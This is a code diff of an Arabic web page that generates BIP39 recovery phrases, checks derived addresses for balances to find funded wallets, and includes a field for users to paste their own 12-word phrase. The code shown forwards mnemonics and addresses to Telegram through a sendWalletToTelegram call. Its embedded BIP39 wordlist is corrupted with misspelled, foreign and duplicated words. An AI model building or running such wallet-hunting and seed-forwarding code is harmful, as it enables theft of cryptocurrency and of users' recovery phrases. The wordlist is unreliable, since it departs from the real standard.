@@ -1,11 +1,9 @@
-<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - جميع العملات</title>
     <style>
-        /* جميع الأنماط السابقة تبقى كما هي */
         * {
             margin: 0;
             padding: 0;
@@ -340,109 +338,6 @@
             border: 1px solid #ffeaa7;
         }
 
-        .test-result {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 15px;
-            border-left: 5px solid #4facfe;
-        }
-
-        .test-result.active {
-            border-left-color: #28a745;
-        }
-
-        .test-result.inactive {
-            border-left-color: #dc3545;
-        }
-
-        .test-result h4 {
-            margin-bottom: 10px;
-            color: #495057;
-        }
-
-        .test-result .balance {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-
-        .test-result .balance.positive {
-            color: #28a745;
-        }
-
-        .test-result .balance.zero {
-            color: #6c757d;
-        }
-
-        .test-result .transactions {
-            margin: 10px 0;
-        }
-
-        .test-result .status {
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-weight: bold;
-            display: inline-block;
-        }
-
-        .test-result .status.active {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .test-result .status.inactive {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        .token-list {
-            margin: 10px 0;
-            padding: 10px;
-            background: #e9ecef;
-            border-radius: 5px;
-        }
-
-        .token-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 5px 0;
-            border-bottom: 1px solid #ced4da;
-        }
-
-        .token-item:last-child {
-            border-bottom: none;
-        }
-
-        /* الأنماط الجديدة المضافة */
-        .generated-mnemonic {
-            background: #e9ecef;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9rem;
-            position: relative;
-        }
-
-        .copy-btn {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: #4facfe;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 5px 10px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            transition: background 0.3s;
-        }
-
-        .copy-btn:hover {
-            background: #3a9de9;
-        }
-
         @media (max-width: 768px) {
             body {
                 padding: 10px;
@@ -545,6 +440,80 @@
         .log-panel::-webkit-scrollbar-thumb:hover {
             background: #adb5bd;
         }
+
+        .test-result {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 15px;
+            border-left: 5px solid #4facfe;
+        }
+
+        .test-result.active {
+            border-left-color: #28a745;
+        }
+
+        .test-result.inactive {
+            border-left-color: #dc3545;
+        }
+
+        .test-result h4 {
+            margin-bottom: 10px;
+            color: #495057;
+        }
+
+        .test-result .balance {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .test-result .balance.positive {
+            color: #28a745;
+        }
+
+        .test-result .balance.zero {
+            color: #6c757d;
+        }
+
+        .test-result .transactions {
+            margin: 10px 0;
+        }
+
+        .test-result .status {
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .test-result .status.active {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .test-result .status.inactive {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .token-list {
+            margin: 10px 0;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+        }
+
+        .token-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #ced4da;
+        }
+
+        .token-item:last-child {
+            border-bottom: none;
+        }
     </style>
 </head>
 <body>
@@ -585,30 +554,64 @@
             <!-- قسم اختبار العبارات يدويًا -->
             <div class="control-panel">
                 <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
-                
-                <!-- قسم العبارات المولدة تلقائيًا -->
                 <div class="control-group">
-                    <label>العبارات المولدة تلقائيًا:</label>
-                    <div id="generatedMnemonic" class="generated-mnemonic">
-                        سيتم عرض العبارات المولدة تلقائيًا هنا...
-                        <button class="copy-btn" onclick="copyGeneratedMnemonic()">نسخ</button>
-                    </div>
-                    <button id="testGeneratedBtn" class="btn btn-primary">
-                        <span>🔍 فحص العبارة المولدة</span>
-                    </button>
-                </div>
-                
-                <div class="control-group">
-                    <label for="manualMnemonic">أدخل عبارة BIP39 يدويًا (12 كلمة):</label>
+                    <label for="manualMnemonic">أدخل عبارة BIP39 (12 كلمة):</label>
                     <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع المكونة من 12 كلمة هنا..."></textarea>
                 </div>
                 <div class="button-group">
                     <button id="testManualBtn" class="btn btn-warning">
-                        <span>🔍 فحص العبارة اليدوية</span>
+                        <span>🔍 فحص العبارة</span>
                     </button>
                 </div>
                 <div id="manualTestResult" class="test-result" style="display: none;">
                     <!-- سيتم ملؤه ديناميكيًا -->
+                </div>
+            </div>
+
+            <!-- قسم الفحص التلقائي للعبارات -->
+            <div class="control-panel">
+                <h3>🤖 الفحص التلقائي للعبارات النشطة والفارغة</h3>
+                <div class="control-group">
+                    <label for="autoTestSpeed">سرعة الفحص التلقائي (مللي ثانية):</label>
+                    <input type="number" id="autoTestSpeed" value="2000" min="500" max="10000" step="500">
+                </div>
+                <div class="control-group">
+                    <label for="autoTestLimit">عدد العبارات المطلوب فحصها (0 = لا نهاية):</label>
+                    <input type="number" id="autoTestLimit" value="10" min="0" max="1000">
+                </div>
+                <div class="control-group">
+                    <label for="testType">نوع الفحص:</label>
+                    <select id="testType">
+                        <option value="all">جميع العبارات (النشطة والفارغة)</option>
+                        <option value="active">العبارات النشطة فقط</option>
+                        <option value="empty">العبارات الفارغة فقط</option>
+                    </select>
+                </div>
+                <div class="button-group">
+                    <button id="startAutoTestBtn" class="btn btn-success">
+                        <span>🤖 بدء الفحص التلقائي</span>
+                    </button>
+                    <button id="stopAutoTestBtn" class="btn btn-danger" disabled>
+                        <span>⏹️ إيقاف الفحص</span>
+                    </button>
+                </div>
+                <div class="status-grid">
+                    <div class="status-card">
+                        <div class="number" id="autoTestTotal">0</div>
+                        <div class="label">إجمالي العبارات المفحوصة</div>
+                    </div>
+                    <div class="status-card">
+                        <div class="number" id="autoTestValid">0</div>
+                        <div class="label">العبارات الصالحة</div>
+                    </div>
+                    <div class="status-card">
+                        <div class="number" id="autoTestActive">0</div>
+                        <div class="label">العبارات النشطة</div>
+                    </div>
+                    <div class="status-card">
+                        <div class="number" id="autoTestEmpty">0</div>
+                        <div class="label">العبارات الفارغة</div>
+                    </div>
                 </div>
             </div>
 
@@ -657,7 +660,218 @@
         const BIP39_WORDLIST = [
             "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
             "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
-            // ... (بقية الكلمات تبقى كما هي)
+            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
+            "adult", "advance", "advice", "aerobic", "affair", "affect", "affirm", "afford", "afraid", "after",
+            "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm",
+            "album", "alcohol", "alert", "alien", "align", "alike", "alive", "allow", "almost", "alone",
+            "alpha", "already", "also", "alter", "always", "amaze", "ambition", "amount", "ample", "analyst",
+            "ancestor", "anchor", "ancient", "android", "animal", "anomaly", "another", "answer", "antenna", "antique",
+            "any", "apart", "appendix", "apple", "apply", "approve", "approximate", "arch", "area", "arena",
+            "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
+            "art", "article", "ascent", "ask", "asleep", "aspect", "assault", "asset", "assist", "assume",
+            "assurance", "assure", "astronomy", "at", "athetic", "atlas", "atom", "attack", "attend", "attitude",
+            "attract", "auction", "audience", "audit", "august", "author", "auto", "available", "avenue", "average",
+            "avoid", "awake", "aware", "away", "awesome", "awful", "axis", "baby", "back", "backup",
+            "bacon", "bad", "bag", "balance", "balcony", "ball", "banana", "band", "bank", "bar",
+            "bare", "bargain", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "become",
+            "beef", "before", "begin", "behalf", "behave", "behind", "believe", "bell", "belong", "below",
+            "belt", "bench", "bend", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
+            "bid", "big", "bill", "binary", "bind", "bio", "bird", "birth", "bitter", "black",
+            "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "block", "blood", "bloom",
+            "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bold",
+            "bolt", "bomb", "bond", "bone", "bonus", "book", "bool", "boost", "border", "bore",
+            "borrow", "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket",
+            "brain", "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath",
+            "breed", "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown",
+            "brush", "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch",
+            "burn", "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus",
+            "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy",
+            "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
+            "care", "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog",
+            "catch", "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor",
+            "central", "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change",
+            "channel", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry",
+            "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
+            "cigar", "cinema", "cipher", "circle", "citizen", "city", "civil", "claim", "clash", "class",
+            "clean", "clear", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock",
+            "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach",
+            "coast", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
+            "comfort", "comic", "common", "company", "compare", "compel", "compensate", "component", "comprise", "computer",
+            "concert", "conclude", "concrete", "confirm", "confuse", "connect", "consider", "console", "conspiracy", "constant",
+            "contact", "contain", "contrast", "control", "convince", "cook", "cool", "copper", "copy", "coral",
+            "core", "corn", "correct", "cosmic", "cost", "cotton", "couch", "country", "couple", "course",
+            "cousin", "cover", "cow", "cowboy", "crack", "cradle", "craft", "cram", "crane", "crash",
+            "crate", "crave", "crawl", "crazy", "cream", "create", "credit", "creek", "crew", "cry",
+            "crypt", "cube", "culture", "cup", "curious", "current", "curve", "cushion", "cut", "cycle",
+            "dad", "damage", "damp", "dance", "danger", "dare", "dark", "dash", "data", "daughter",
+            "dawn", "day", "deal", "debate", "decade", "decay", "deceive", "december", "decide", "decline",
+            "decorate", "decrease", "deer", "defend", "define", "defy", "degree", "delay", "deliver", "demand",
+            "demise", "denounce", "dense", "dentist", "deny", "depart", "depend", "depict", "deposit", "depress",
+            "depth", "deputy", "derive", "describe", "desert", "design", "desire", "desktop", "despise", "destroy",
+            "detail", "detect", "determine", "develop", "device", "devote", "diagnose", "diamond", "diary", "dice",
+            "die", "diesel", "diet", "differ", "dig", "digit", "dignity", "dilemma", "dinner", "dip",
+            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "dispose",
+            "distance", "distract", "district", "ditch", "dive", "divide", "divorce", "dizzy", "doctor", "document",
+            "dog", "doll", "domestic", "donor", "door", "dose", "double", "doubt", "down", "download",
+            "dozens", "draft", "drag", "drain", "drama", "draw", "dream", "dress", "drink", "drip",
+            "drive", "drop", "dry", "duck", "duplicate", "dust", "duty", "dwarf", "dwell", "dynamic",
+            "eager", "eagle", "ear", "earlier", "early", "earn", "earth", "easily", "east", "easy",
+            "echo", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
+            "elder", "electric", "elegant", "element", "elevate", "eleven", "elite", "else", "embark", "embed",
+            "embryo", "emit", "empire", "empty", "enable", "encode", "end", "endorse", "endure", "enemy",
+            "energy", "enforce", "engage", "engine", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
+            "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "equivalent", "era", "erase",
+            "erect", "error", "escape", "especially", "essay", "essence", "establish", "estimate", "eternal", "ethical",
+            "ethics", "even", "evening", "event", "ever", "every", "evident", "evil", "evoke", "evolve",
+            "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust",
+            "exhibit", "exile", "exist", "exit", "expand", "expect", "experience", "expert", "explain", "explode",
+            "explore", "export", "expose", "express", "extend", "extra", "extract", "ordinary", "extreme", "eyebrow",
+            "eye", "fable", "face", "faculty", "fade", "fail", "fair", "faith", "fall", "false",
+            "fame", "family", "famous", "fan", "fancy", "farm", "fashion", "fast", "fate", "father",
+            "fault", "favor", "favorite", "fear", "feature", "february", "federation", "fee", "feed", "feel",
+            "female", "fence", "festival", "fetch", "few", "fiber", "fiction", "field", "figure", "file",
+            "fill", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
+            "fiscal", "fish", "fit", "fitness", "five", "fix", "flag", "flame", "flash", "flat",
+            "flavor", "flee", "flesh", "flex", "flight", "flip", "float", "flock", "floor", "flower",
+            "fluid", "flush", "fly", "foam", "focus", "follow", "food", "foot", "force", "forest",
+            "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "four", "fox",
+            "fragile", "frame", "fresh", "friend", "frog", "front", "frost", "frown", "frozen", "fruity",
+            "fury", "future", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden",
+            "garlic", "gas", "gate", "gather", "gauge", "generate", "genius", "genre", "gentle", "gently",
+            "german", "gesture", "get", "ghost", "giant", "gift", "ginger", "girl", "give", "glad",
+            "glance", "glass", "glide", "glimpse", "global", "globe", "gloom", "glory", "glove", "glow",
+            "glue", "go", "goal", "goat", "god", "gold", "good", "goose", "gorgeous", "gorilla",
+            "gospel", "gossip", "govern", "grab", "grace", "grade", "grain", "grand", "grant", "grape",
+            "grasp", "grass", "gravity", "gray", "great", "greek", "green", "greet", "grid", "grief",
+            "grim", "grip", "grit", "groan", "groom", "groove", "gross", "ground", "group", "grow",
+            "guarantee", "guard", "guess", "guide", "guitar", "gulf", "gun", "gym", "habit", "hair",
+            "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "hardware", "hardy", "harm",
+            "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog",
+            "height", "hello", "help", "hence", "her", "here", "heritage", "hero", "hide", "high",
+            "hill", "hint", "hip", "hire", "his", "historic", "history", "hit", "hive", "hobby",
+            "hoe", "hold", "hollow", "honest", "honey", "honor", "hope", "horizon", "horn", "horror",
+            "horse", "hospital", "host", "hotel", "hour", "hover", "how", "human", "humble", "humor",
+            "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "hush", "hybrid", "ice", "icon",
+            "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
+            "imminent", "immoral", "impact", "impose", "impress", "improve", "impulse", "in", "inch", "include",
+            "income", "increase", "index", "indicate", "infinite", "inflate", "influence", "inform", "initial", "inject",
+            "injury", "inner", "incentive", "input", "insane", "insect", "inside", "inspect", "inspire", "install",
+            "instinct", "institute", "instruct", "instrument", "insulate", "insure", "intact", "interest", "internal", "interact",
+            "internet", "interpret", "into", "invade", "invent", "invest", "invite", "involve", "iron", "is",
+            "island", "isolate", "issue", "item", "its", "jacket", "jail", "jam", "jar", "jazz",
+            "jealous", "jeans", "jeep", "jelly", "jewel", "job", "join", "joint", "joystick", "judge",
+            "juice", "july", "jump", "jungle", "junior", "junk", "just", "justice", "keen", "keep",
+            "keeper", "kernel", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
+            "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "knowledge", "lab",
+            "label", "labor", "lack", "ladder", "lady", "lag", "lake", "lamp", "language", "lap",
+            "laptop", "large", "larva", "laser", "last", "laugh", "launch", "lavish", "law", "lawn",
+            "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
+            "legend", "leisure", "lemon", "lend", "length", "lens", "lentil", "leopard", "less", "lesson",
+            "let", "letter", "level", "liar", "liberty", "library", "license", "life", "light", "like",
+            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "load", "loan",
+            "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lost", "lotion", "loud",
+            "lounge", "love", "loyal", "luck", "luggage", "lumber", "lunch", "lung", "luxury", "lyrics",
+            "macro", "magic", "magnify", "mail", "main", "major", "make", "mammal", "man", "manage",
+            "mango", "manifold", "manner", "manual", "many", "marble", "march", "margin", "marine", "market",
+            "marry", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
+            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melon",
+            "memo", "memory", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
+            "method", "middle", "might", "mighty", "migrate", "mile", "military", "milk", "mill", "minimum",
+            "mint", "minute", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixer", "mobile",
+            "model", "modify", "moment", "money", "monitor", "monkey", "monster", "month", "moon", "moral",
+            "more", "morning", "mortgage", "most", "mother", "motor", "mountain", "mouse", "move", "movie",
+            "much", "muffin", "mule", "multiply", "murmur", "muscle", "museum", "mushroom", "music", "must",
+            "mutual", "my", "mystery", "myth", "nail", "name", "narrow", "nasty", "nation", "natural",
+            "nature", "near", "neck", "need", "negotiate", "neighbor", "neither", "nervous", "network", "neutral",
+            "never", "news", "next", "nice", "night", "nine", "noble", "noise", "nomad", "none",
+            "noon", "normal", "north", "nose", "notable", "note", "nothing", "notice", "noun", "now",
+            "nuclear", "number", "nun", "nurse", "nut", "oath", "obey", "object", "oblige", "obscene",
+            "observe", "obtain", "occasion", "ocean", "october", "odds", "off", "offense", "office", "often",
+            "oil", "okay", "old", "olive", "omega", "on", "once", "one", "only", "open",
+            "opera", "opinion", "oppose", "opposite", "option", "orange", "orbit", "orchard", "order", "ordinary",
+            "organ", "origin", "original", "orphan", "other", "ought", "ounce", "our", "outside", "oven",
+            "over", "owner", "oxygen", "pace", "pack", "package", "page", "pain", "paint", "pair",
+            "pale", "palm", "pan", "panda", "panel", "panic", "pant", "paper", "parade", "parent",
+            "park", "parrot", "party", "pass", "passage", "past", "paste", "path", "patient", "patrol",
+            "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pepper", "perfect",
+            "perform", "period", "permit", "person", "pet", "phone", "photo", "phrase", "pick", "picture",
+            "piece", "pierce", "pig", "pigeon", "pill", "pilot", "pine", "pink", "pioneer", "pistol",
+            "pitch", "pivot", "pixel", "place", "plain", "plan", "planet", "plastic", "plate", "play",
+            "please", "pledge", "pluck", "plug", "plunge", "pole", "police", "policy", "polish", "pollution",
+            "pool", "popular", "portion", "position", "possible", "post", "potato", "potent", "pound", "poverty",
+            "powder", "power", "practice", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride",
+            "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit",
+            "program", "project", "promise", "promote", "proof", "property", "prosper", "protect", "provide", "prune",
+            "public", "pudding", "pull", "pulp", "pulse", "pump", "punish", "pupil", "puppy", "purchase",
+            "pure", "purge", "push", "put", "puzzle", "pyramid", "quality", "quantify", "quarter", "question",
+            "quick", "quit", "quiz", "quote", "rabbit", "race", "rack", "radar", "radio", "rail",
+            "rain", "raise", "rally", "ram", "ranch", "random", "range", "rapid", "rare", "rash",
+            "rate", "rather", "raven", "raw", "reach", "read", "ready", "real", "reason", "rebel",
+            "rebuild", "recall", "receive", "recipe", "record", "recover", "recruit", "recycle", "reduce", "reflect",
+            "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely",
+            "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat",
+            "replace", "report", "represent", "republic", "require", "rescue", "research", "reside", "resist", "resolve",
+            "resort", "resource", "response", "result", "retire", "retreat", "return", "reveal", "review", "reward",
+            "rhythm", "ribbon", "rice", "rich", "riddle", "ride", "ridge", "rifle", "right", "rigid",
+            "ring", "rinsing", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
+            "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
+            "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "rural", "rush",
+            "raccoon", "sad", "saddle", "safe", "safety", "salad", "salary", "sale", "sally", "salt",
+            "same", "sample", "sanctuary", "sand", "satisfy", "satellite", "satisfy", "sauce", "save", "say",
+            "scale", "scan", "scare", "scatter", "scene", "school", "science", "scissors", "scorpion", "scout",
+            "scrap", "screen", "screw", "script", "scrub", "sea", "search", "season", "seat", "second",
+            "secret", "section", "security", "see", "seed", "seek", "segment", "select", "self", "sell",
+            "seminar", "senior", "sense", "sentence", "series", "service", "session", "set", "settle", "setup",
+            "seven", "several", "severe", "sex", "shadow", "shaft", "shake", "shallow", "shame", "shape",
+            "share", "shark", "sharp", "shave", "she", "sheep", "sheet", "shelf", "shell", "shield",
+            "shift", "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder",
+            "shove", "show", "shrimp", "shrink", "shrug", "shuffle", "shy", "sick", "side", "siege",
+            "sift", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "simply",
+            "since", "sing", "single", "sink", "sister", "situate", "six", "size", "skate", "sketch",
+            "skill", "skin", "skirt", "sky", "slam", "sleep", "slice", "slide", "slim", "slip",
+            "slope", "slow", "sly", "small", "smart", "smile", "smoke", "smooth", "snap", "sniff",
+            "snow", "snuggle", "so", "social", "sock", "soft", "soil", "solar", "soldier", "solid",
+            "solve", "some", "someone", "something", "sometimes", "son", "song", "soon", "sorry", "sort",
+            "soul", "sound", "source", "south", "space", "spark", "speak", "special", "speed", "spell",
+            "spend", "sphere", "spice", "spider", "spirit", "split", "spread", "spring", "spy", "squad",
+            "square", "squeeze", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay",
+            "steady", "steam", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stir",
+            "stock", "stomach", "stone", "stool", "story", "strain", "strand", "strange", "strap", "strategy",
+            "stream", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
+            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
+            "sun", "sunday", "sunrise", "sunshine", "super", "supply", "support", "supreme", "sure", "surface",
+            "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "sweat", "sweep",
+            "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system",
+            "table", "tackle", "tag", "tail", "talent", "talk", "tall", "tame", "tank", "tape",
+            "target", "task", "taste", "tattoo", "tax", "teach", "team", "tear", "tech", "text",
+            "than", "thank", "that", "the", "then", "theme", "them", "thence", "theory", "there",
+            "therefore", "these", "they", "thick", "thief", "thin", "thing", "think", "third", "this",
+            "those", "though", "thread", "three", "thrive", "throw", "thumb", "thus", "ticket", "tide",
+            "tiger", "tight", "tile", "till", "time", "tiny", "tip", "tire", "tissue", "title",
+            "to", "toad", "today", "toe", "together", "token", "tolerance", "tomato", "tomorrow", "tone",
+            "tongue", "tonight", "too", "tool", "tooth", "top", "topic", "toss", "total", "touch",
+            "tough", "tour", "toward", "tower", "town", "toy", "trace", "track", "trade", "traffic",
+            "tragedy", "trail", "train", "transfer", "transform", "trap", "trash", "travel", "tray", "tread",
+            "treasure", "treat", "tree", "trend", "trial", "tribe", "trick", "truly", "trumpet", "trust",
+            "try", "tube", "tug", "tumble", "tuna", "tunnel", "turbo", "twelve", "twenty", "twice",
+            "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncertain",
+            "unchain", "uncle", "under", "undermine", "understand", "undo", "uneasy", "unfair", "unfold", "unhappy",
+            "unify", "union", "unique", "unit", "universe", "unknown", "unless", "unload", "unlock", "until",
+            "untouched", "up", "update", "uplift", "upload", "upset", "urban", "urge", "us", "usage",
+            "use", "used", "useful", "usher", "usual", "utility", "vacant", "vague", "valid", "valley",
+            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "vellum", "velvet",
+            "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "vial",
+            "vibrant", "vicious", "victory", "video", "view", "village", "vine", "violet", "virtue", "visual",
+            "vital", "vivid", "vocal", "vocals", "vote", "voyage", "vs", "vulnerable", "wage", "wait",
+            "walk", "wall", "walnut", "want", "war", "ward", "warm", "warn", "wash", "wasp",
+            "waste", "watch", "water", "wave", "way", "we", "weak", "wealth", "weapon", "wear",
+            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
+            "what", "wheat", "wheel", "when", "where", "whether", "which", "while", "whisper", "wide",
+            "widget", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter",
+            "wire", "wisdom", "wise", "wish", "withdraw", "within", "without", "woman", "wonder", "wood",
+            "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "write", "wrong",
+            "yard", "yearn", "year", "yell", "yellow", "you", "young", "your", "youth", "zeal",
+            "zero", "zone", "zoo"
         ];
 
         // إعدادات التطبيق
@@ -714,12 +928,21 @@
         // متغيرات العملية
         let isRunning = false;
         let searchInterval = null;
-        let lastGeneratedMnemonic = '';
         let stats = {
             totalGenerated: 0,
             activeWallets: 0,
             emptyWallets: 0,
             errors: 0
+        };
+
+        // متغيرات الفحص التلقائي
+        let isAutoTestRunning = false;
+        let autoTestInterval = null;
+        let autoTestStats = {
+            total: 0,
+            valid: 0,
+            active: 0,
+            empty: 0
         };
 
         // عناصر DOM
@@ -729,9 +952,7 @@
             testTelegramBtn: document.getElementById('testTelegramBtn'),
             clearLogsBtn: document.getElementById('clearLogsBtn'),
             testManualBtn: document.getElementById('testManualBtn'),
-            testGeneratedBtn: document.getElementById('testGeneratedBtn'),
             manualMnemonic: document.getElementById('manualMnemonic'),
-            generatedMnemonic: document.getElementById('generatedMnemonic'),
             manualTestResult: document.getElementById('manualTestResult'),
             searchSpeed: document.getElementById('searchSpeed'),
             maxAttempts: document.getElementById('maxAttempts'),
@@ -742,7 +963,16 @@
             progressFill: document.getElementById('progressFill'),
             currentStatus: document.getElementById('currentStatus'),
             logPanel: document.getElementById('logPanel'),
-            currentTime: document.getElementById('currentTime')
+            currentTime: document.getElementById('currentTime'),
+            startAutoTestBtn: document.getElementById('startAutoTestBtn'),
+            stopAutoTestBtn: document.getElementById('stopAutoTestBtn'),
+            autoTestSpeed: document.getElementById('autoTestSpeed'),
+            autoTestLimit: document.getElementById('autoTestLimit'),
+            testType: document.getElementById('testType'),
+            autoTestTotal: document.getElementById('autoTestTotal'),
+            autoTestValid: document.getElementById('autoTestValid'),
+            autoTestActive: document.getElementById('autoTestActive'),
+            autoTestEmpty: document.getElementById('autoTestEmpty')
         };
 
         // تحديث الوقت الحالي
@@ -1013,6 +1243,13 @@
             }
         }
 
+        function updateAutoTestStats() {
+            elements.autoTestTotal.textContent = autoTestStats.total;
+            elements.autoTestValid.textContent = autoTestStats.valid;
+            elements.autoTestActive.textContent = autoTestStats.active;
+            elements.autoTestEmpty.textContent = autoTestStats.empty;
+        }
+
         function updateStatus(message, type = 'info') {
             elements.currentStatus.textContent = message;
             elements.currentStatus.className = `alert alert-${type}`;
@@ -1029,10 +1266,6 @@
 
                 const mnemonic = generateRandomBIP39Phrase();
                 stats.totalGenerated++;
-                
-                // حفظ العبارة المولدة لعرضها في قسم الاختبار اليدوي
-                lastGeneratedMnemonic = mnemonic;
-                elements.generatedMnemonic.textContent = mnemonic;
                 
                 updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
                 addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
@@ -1138,73 +1371,14 @@
                     }
                 }
                 
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة اليدوية</span>';
+                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
                 elements.testManualBtn.disabled = false;
                 
             } catch (error) {
                 updateStatus(`❌ خطأ في فحص العبارة: ${error.message}`, 'danger');
                 addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة اليدوية</span>';
+                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
                 elements.testManualBtn.disabled = false;
-            }
-        }
-
-        // وظيفة اختبار العبارات المولدة تلقائيًا
-        async function testGeneratedMnemonic() {
-            if (!lastGeneratedMnemonic) {
-                updateStatus('لم يتم توليد أي عبارة بعد. يرجى بدء البحث أولاً.', 'warning');
-                return;
-            }
-            
-            try {
-                if (!checkEthersLoaded()) {
-                    return;
-                }
-
-                updateStatus('جاري فحص العبارة المولدة...', 'info');
-                addLogEntry(`🔍 جاري فحص العبارة المولدة: ${lastGeneratedMnemonic}`);
-                
-                elements.testGeneratedBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
-                elements.testGeneratedBtn.disabled = true;
-                
-                const address = await mnemonicToAddress(lastGeneratedMnemonic);
-                
-                addLogEntry(`✅ تم تحويل العبارة المولدة إلى العنوان: ${address}`);
-                
-                const walletStatus = await isWalletActive(address);
-                
-                updateManualTestResult(lastGeneratedMnemonic, address, walletStatus);
-                
-                const telegramSent = await sendWalletToTelegram(lastGeneratedMnemonic, address, walletStatus, walletStatus.isActive);
-                
